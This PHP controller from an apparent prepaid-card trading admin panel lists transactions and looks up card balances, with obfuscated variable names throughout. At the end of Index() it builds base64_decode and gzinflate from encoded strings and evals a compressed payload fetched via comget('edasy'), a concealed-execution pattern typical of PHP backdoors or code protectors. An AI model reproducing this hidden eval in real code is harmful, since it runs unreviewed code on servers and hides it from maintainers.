<?php
/*********************/
/*                   */
/*  Version : 5.1.0  */
/*  Author  : RM     */
/*  Comment : 071223 */
/*                   */
/*********************/

if ( !defined( "UPATH_ROOT" ) )
{
				exit( "hacking deny" );
}
class TradeController extends Controller
{

				public $hander = NULL;
				public $action = NULL;
				public $ishistory = NULL;
				public $tradetable = NULL;

				public function __construct( )
				{
								$this->action = array( "trdlist" );
								$this->ishistory = intval( request( "ishistory" ) ) == 1 ? "history" : "";
								$this->tradetable = "trades".$this->ishistory;
				}

				public function Index( )
				{
								$this->hander = factory::getinstance( $this->tradetable );
								$R71a664ef8c = $this->PageInfo( );
								$R1e3bc50f23 = $this->DateSet( );
								$Ra8b176bf4f = getvar( "tradetype", "1,2,21,22,31,32,60,61,96,98,99,101,100" );
								if ( $Ra8b176bf4f == "" )
								{
												$Ra8b176bf4f = "1,2,21,22,31,32,60,61,96,98,99,101,100";
								}
								$R901a6b96db = intval( request( "state", -2 ) );
								$data = array(
												"ykt" => getvar( "ykt" ),
												"tradetype" => $Ra8b176bf4f,
												"admname" => getvar( "admname" ),
												"noykt" => 1
								);
								if ( -2 < $R901a6b96db )
								{
												$data['state'] = $R901a6b96db;
								}
								$data = array_merge( $data, $R1e3bc50f23[0], $R71a664ef8c );
								$R4e420efcc3 = $this->hander->ITrade_Page( $data );
								$this->FillPage( $data, $R4e420efcc3 );
								$Rda3ac1bf9a = 0;
								$R2a51483b14 = intval( request( "aid" ) );
								if ( 0 < $R2a51483b14 )
								{
												$R2097a8fddf = factory::getinstance( "agents" );
												$agent = $R2097a8fddf->IAgent_Get( $R2a51483b14, "aremain" );
												$Rda3ac1bf9a = $agent['aremain'];
								}
								$this->Assign( "remain", $Rda3ac1bf9a );
								$R0d2025d631 = $this->hander->ITrade_GetByLimit( $data, "sum(income) as income,sum(outcome) as outcome" );
								$this->Assign( "record", $R0d2025d631 );
								$R00be52aa45 = array( "ordno" => "订单号", "aid" => "用户编号", "operator" => "操作者", "otherside" => "交易方", "yktnumber" => "一卡通卡号", "content" => "相关说明", "admname" => "管理员操作者" );
								$R8dc7d3eb73 = array( "0" => "所有平台", "1" => "批发", "2" => "零售", "3" => "一卡通" );
								if ( $Ra8b176bf4f == 11 )
								{
												$R4fa9c48c92 = array( "11" => "点卡交易产生的代理利润" );
								}
								else if ( $Ra8b176bf4f == 12 )
								{
												$R4fa9c48c92 = array( "12" => "供货所得" );
								}
								else
								{
												$R4fa9c48c92 = array( "1,2,21,22,31,32,60,61,96,98,99,101,100" => "所有类型", "1" => "普通点卡交易", "2" => "用户网银充值", "21" => "贷款给别人", "22" => "向别人借款", "31" => "转款给别人", "32" => "别人转款给我", "60" => "生效一卡通", "61" => "一卡通返点", "96" => "积分兑换余额记录", "98" => "资金操作产生的交易记录", "99" => "系统给我充值", "100" => "一卡通兑换卡记录", "101" => "一卡通充值记录", "31,32" => "所有转款记录", "21,22" => "所有贷款/借款记录" );
								}
								$Oooo00 = "base64_decode";
								$ooOO00o = $Oooo00( "YmFzZTY0X2RlY29kZQ==" );
								$o00OO = $Oooo00( "Z3ppbmZsYXRl" );
								$cphp0 = __FILE__;
								eval( $o00OO( $ooOO00o( $this->comget( "edasy" ) ) ) );
				}

				public function Ykt( )
				{
							
												$this->View( );
							
				}

				public function Agent( )
				{
							
												$this->View( );
							
				}

				public function AgentOrderProfit( )
				{
							
												$this->View( );
							
				}

				public function State( )
				{
								$R1df8368da5 = getvar( "keywords" );
								if ( $R1df8368da5 != "" )
								{
												$Rf541845af3 = factory::getinstance( "cards" );
												$data = array(
																"cardnumber" => $R1df8368da5
												);
												$R3db8f5c8bc = $Rf541845af3->ICard_GetByLimit( $data );
												if ( isset( $R3db8f5c8bc['money'] ) && 99 < $R3db8f5c8bc['ptype'] )
												{
																$this->Assign( "card", $R3db8f5c8bc );
												}
												else
												{
																$this->Alert( "没有此一卡通！请重新输入" );
																$this->HistoryGo( );
												}
								}
								$this->Assign( "cardnumber", $R1df8368da5 );
								$R89704cdc90 = intval( request( "tradestate" ) );
								$this->Assign( "tradestate", $R89704cdc90 );
								$R89704cdc90 = $R89704cdc90 == 1 ? true : false;
								if ( $R1df8368da5 != "" )
								{
												$Race6ab87b1 = factory::getinstance( $this->tradetable );
												$R4e420efcc3 = $Race6ab87b1->ITrade_GetByYktNumber( $R1df8368da5, "*", $R89704cdc90 );
								}
								else
								{
												$R4e420efcc3 = array( );
								}
								$this->Assign( "items", $R4e420efcc3 );
							
												$this->View( );
							
				}

}

?>
